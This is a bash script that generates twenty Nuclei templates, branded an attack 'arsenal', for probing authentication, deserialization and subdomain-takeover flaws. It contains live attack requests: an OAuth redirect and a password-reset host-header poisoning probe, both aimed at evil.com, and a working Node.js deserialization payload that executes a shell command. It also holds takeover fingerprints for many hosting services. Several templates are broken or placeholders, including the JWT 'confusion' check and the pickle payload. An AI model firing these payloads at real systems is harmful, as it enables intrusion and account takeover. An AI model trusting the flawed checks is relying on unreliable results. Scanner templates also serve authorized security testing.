#!/bin/bash
# K70n0s510 IDENTITY & TAKEOVER PACK
# 20 Templates for Auth, Deserialization, and Subdomain Takeovers.

BASE_DIR="$HOME/K70n0s510_templates/owasp-2025"
mkdir -p "$BASE_DIR/A07-authentication/auth-nuclear"
mkdir -p "$BASE_DIR/A08-integrity/deserial-nuclear"
mkdir -p "$BASE_DIR/A02-misconfiguration/takeover-nuclear"

echo "🆔 Building Identity & Takeover Arsenal..."

# ==========================================
# PART 1: A07 - AUTHENTICATION (OAuth & JWT)
# ==========================================

# 1. OAuth Open Redirect (redirect_uri)
cat <<EOF > "$BASE_DIR/A07-authentication/auth-nuclear/oauth-redirect.yaml"
id: K70n0s510-oauth-redirect
info:
  name: OAuth Open Redirect
  author: K70n0s510
  severity: high
  tags: a07,oauth,redirect
http:
  - method: GET
    path: ["{{BaseURL}}/oauth/authorize?client_id=1&response_type=code&redirect_uri=http://evil.com"]
    matchers:
      - type: regex
        part: header
        regex: ["Location:.*evil\\.com"]
EOF

# 2. JWT Algorithm Confusion (RS256 -> HS256)
# Checks if server accepts a token signed with the public key as a secret.
cat <<EOF > "$BASE_DIR/A07-authentication/auth-nuclear/jwt-algo-confusion.yaml"
id: K70n0s510-jwt-confusion
info:
  name: JWT Algorithm Confusion
  author: K70n0s510
  severity: critical
  tags: a07,jwt,auth
http:
  - method: GET
    path: ["{{BaseURL}}/api/user"]
    headers:
      Authorization: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.signature_placeholder"
    matchers:
      - type: word
        words: ["Invalid signature", "Unauthorized"]
        negative: true
EOF

# 3. Basic Auth over HTTP (Unencrypted)
cat <<EOF > "$BASE_DIR/A07-authentication/auth-nuclear/basic-auth-http.yaml"
id: K70n0s510-basic-http
info:
  name: Basic Auth over HTTP
  author: K70n0s510
  severity: medium
  tags: a07,auth,ssl
http:
  - method: GET
    path: ["{{BaseURL}}"]
    matchers:
      - type: word
        part: header
        words: ["WWW-Authenticate: Basic"]
      - type: dsl
        dsl: ["scheme == 'http'"]
EOF

# 4. Host Header Injection (Password Reset Poisoning)
cat <<EOF > "$BASE_DIR/A07-authentication/auth-nuclear/host-header-poison.yaml"
id: K70n0s510-host-poison
info:
  name: Host Header Poisoning (Password Reset)
  author: K70n0s510
  severity: high
  tags: a07,host-header
http:
  - method: POST
    path: ["{{BaseURL}}/password/reset"]
    headers:
      Host: "evil.com"
      X-Forwarded-Host: "evil.com"
    body: "email=admin@{{Host}}"
    matchers:
      - type: word
        words: ["email sent", "success"]
      # Need manual verification if the link in email points to evil.com
EOF

# 5. Weak 2FA Logic (Rate Limit Check)
cat <<EOF > "$BASE_DIR/A07-authentication/auth-nuclear/weak-2fa.yaml"
id: K70n0s510-weak-2fa
info:
  name: Weak 2FA Implementation
  author: K70n0s510
  severity: medium
  tags: a07,2fa
http:
  - method: POST
    path: ["{{BaseURL}}/api/2fa/verify"]
    body: "code=000000"
    matchers:
      - type: word
        words: ["invalid code"]
      - type: word
        words: ["Rate limit exceeded"]
        negative: true
EOF

# ==========================================
# PART 2: A08 - INSECURE DESERIALIZATION (RCE)
# ==========================================

# 6. Python Pickle RCE
cat <<EOF > "$BASE_DIR/A08-integrity/deserial-nuclear/python-pickle.yaml"
id: K70n0s510-pickle-rce
info:
  name: Python Pickle Deserialization RCE
  author: K70n0s510
  severity: critical
  tags: a08,python,rce
http:
  - method: POST
    path: ["{{BaseURL}}/api/data"]
    headers: {Content-Type: "application/x-python-pickle"}
    body: "gASV......(malicious_pickle_payload)......" 
    matchers:
      - type: regex
        regex: ["root:.*:0:0:"]
EOF

# 7. PHP Object Injection
cat <<EOF > "$BASE_DIR/A08-integrity/deserial-nuclear/php-object.yaml"
id: K70n0s510-php-object
info:
  name: PHP Object Injection
  author: K70n0s510
  severity: high
  tags: a08,php,rce
http:
  - method: GET
    path: ["{{BaseURL}}/?data=O:4:\"User\":2:{s:4:\"name\";s:5:\"admin\";}"]
    matchers:
      - type: word
        words: ["Fatal error", "Call to undefined method"]
EOF

# 8. Node.js Unserialization RCE
cat <<EOF > "$BASE_DIR/A08-integrity/deserial-nuclear/node-unserialize.yaml"
id: K70n0s510-node-rce
info:
  name: Node.js Unserialization RCE
  author: K70n0s510
  severity: critical
  tags: a08,node,rce
http:
  - method: POST
    path: ["{{BaseURL}}/"]
    headers: {Content-Type: "application/json"}
    body: '{"rce":"_$$ND_FUNC$$_function (){require(\"child_process\").exec(\"id\", function(error, stdout, stderr) { console.log(stdout) });}()"}'
    matchers:
      - type: regex
        regex: ["uid=[0-9]+.*gid=[0-9]+"]
EOF

# 9. Java Deserialization (Generic)
cat <<EOF > "$BASE_DIR/A08-integrity/deserial-nuclear/java-deserial.yaml"
id: K70n0s510-java-deserial
info:
  name: Java Deserialization Header
  author: K70n0s510
  severity: high
  tags: a08,java,rce
http:
  - method: GET
    path: ["{{BaseURL}}/"]
    headers:
      Content-Type: "application/x-java-serialized-object"
    matchers:
      - type: word
        words: ["rO0AB"] # Java Serialization Magic Bytes in Base64
EOF

# 10. ASP.NET ViewState MAC Validation
cat <<EOF > "$BASE_DIR/A08-integrity/deserial-nuclear/viewstate-mac.yaml"
id: K70n0s510-viewstate-mac
info:
  name: ASP.NET ViewState No MAC
  author: K70n0s510
  severity: medium
  tags: a08,aspnet
http:
  - method: GET
    path: ["{{BaseURL}}/"]
    matchers:
      - type: word
        words: ["__VIEWSTATE"]
      - type: regex
        regex: ["__VIEWSTATEGENERATOR"]
        negative: true # If MAC is missing, it might be vulnerable
EOF

# ==========================================
# PART 3: A02 - SUBDOMAIN TAKEOVER (God Mode)
# ==========================================

# 11. AWS S3 Takeover
cat <<EOF > "$BASE_DIR/A02-misconfiguration/takeover-nuclear/takeover-s3.yaml"
id: K70n0s510-takeover-s3
info:
  name: AWS S3 Subdomain Takeover
  author: K70n0s510
  severity: high
  tags: takeover,aws
http:
  - method: GET
    path: ["{{BaseURL}}"]
    matchers-condition: and
    matchers:
      - type: cname
        cname: ["s3.amazonaws.com"]
      - type: word
        words: ["The specified bucket does not exist"]
EOF

# 12. GitHub Pages Takeover
cat <<EOF > "$BASE_DIR/A02-misconfiguration/takeover-nuclear/takeover-github.yaml"
id: K70n0s510-takeover-github
info:
  name: GitHub Pages Subdomain Takeover
  author: K70n0s510
  severity: high
  tags: takeover,github
http:
  - method: GET
    path: ["{{BaseURL}}"]
    matchers-condition: and
    matchers:
      - type: cname
        cname: ["github.io"]
      - type: word
        words: ["404 - There isn't a GitHub Pages site here"]
EOF

# 13. Heroku Takeover
cat <<EOF > "$BASE_DIR/A02-misconfiguration/takeover-nuclear/takeover-heroku.yaml"
id: K70n0s510-takeover-heroku
info:
  name: Heroku Subdomain Takeover
  author: K70n0s510
  severity: high
  tags: takeover,heroku
http:
  - method: GET
    path: ["{{BaseURL}}"]
    matchers-condition: and
    matchers:
      - type: cname
        cname: ["herokuapp.com"]
      - type: word
        words: ["No such app"]
EOF

# 14. Azure Traffic Manager Takeover
cat <<EOF > "$BASE_DIR/A02-misconfiguration/takeover-nuclear/takeover-azure.yaml"
id: K70n0s510-takeover-azure
info:
  name: Azure Traffic Manager Takeover
  author: K70n0s510
  severity: high
  tags: takeover,azure
http:
  - method: GET
    path: ["{{BaseURL}}"]
    matchers-condition: and
    matchers:
      - type: cname
        cname: ["trafficmanager.net"]
      - type: word
        words: ["404 Web Site not found"]
EOF

# 15. Shopify Takeover
cat <<EOF > "$BASE_DIR/A02-misconfiguration/takeover-nuclear/takeover-shopify.yaml"
id: K70n0s510-takeover-shopify
info:
  name: Shopify Subdomain Takeover
  author: K70n0s510
  severity: high
  tags: takeover,shopify
http:
  - method: GET
    path: ["{{BaseURL}}"]
    matchers-condition: and
    matchers:
      - type: cname
        cname: ["myshopify.com"]
      - type: word
        words: ["Sorry, this shop is currently unavailable"]
EOF

# 16. Tumblr Takeover
cat <<EOF > "$BASE_DIR/A02-misconfiguration/takeover-nuclear/takeover-tumblr.yaml"
id: K70n0s510-takeover-tumblr
info:
  name: Tumblr Subdomain Takeover
  author: K70n0s510
  severity: high
  tags: takeover,tumblr
http:
  - method: GET
    path: ["{{BaseURL}}"]
    matchers-condition: and
    matchers:
      - type: cname
        cname: ["domains.tumblr.com"]
      - type: word
        words: ["There's nothing here."]
EOF

# 17. Zendesk Takeover
cat <<EOF > "$BASE_DIR/A02-misconfiguration/takeover-nuclear/takeover-zendesk.yaml"
id: K70n0s510-takeover-zendesk
info:
  name: Zendesk Subdomain Takeover
  author: K70n0s510
  severity: high
  tags: takeover,zendesk
http:
  - method: GET
    path: ["{{BaseURL}}"]
    matchers-condition: and
    matchers:
      - type: cname
        cname: ["zendesk.com"]
      - type: word
        words: ["Help Center Closed"]
EOF

# 18. Squarespace Takeover
cat <<EOF > "$BASE_DIR/A02-misconfiguration/takeover-nuclear/takeover-squarespace.yaml"
id: K70n0s510-takeover-squarespace
info:
  name: Squarespace Subdomain Takeover
  author: K70n0s510
  severity: high
  tags: takeover,squarespace
http:
  - method: GET
    path: ["{{BaseURL}}"]
    matchers-condition: and
    matchers:
      - type: cname
        cname: ["squarespace.com"]
      - type: word
        words: ["expired-account"]
EOF

# 19. WP Engine Takeover
cat <<EOF > "$BASE_DIR/A02-misconfiguration/takeover-nuclear/takeover-wpengine.yaml"
id: K70n0s510-takeover-wpengine
info:
  name: WP Engine Subdomain Takeover
  author: K70n0s510
  severity: high
  tags: takeover,wpengine
http:
  - method: GET
    path: ["{{BaseURL}}"]
    matchers-condition: and
    matchers:
      - type: cname
        cname: ["wpengine.com"]
      - type: word
        words: ["The site you were looking for could not be found"]
EOF

# 20. Pantheon Takeover
cat <<EOF > "$BASE_DIR/A02-misconfiguration/takeover-nuclear/takeover-pantheon.yaml"
id: K70n0s510-takeover-pantheon
info:
  name: Pantheon Subdomain Takeover
  author: K70n0s510
  severity: high
  tags: takeover,pantheon
http:
  - method: GET
    path: ["{{BaseURL}}"]
    matchers-condition: and
    matchers:
      - type: cname
        cname: ["pantheon.io"]
      - type: word
        words: ["404 error unknown site"]
EOF

echo "✅ 20 Identity & Takeover Templates Built."
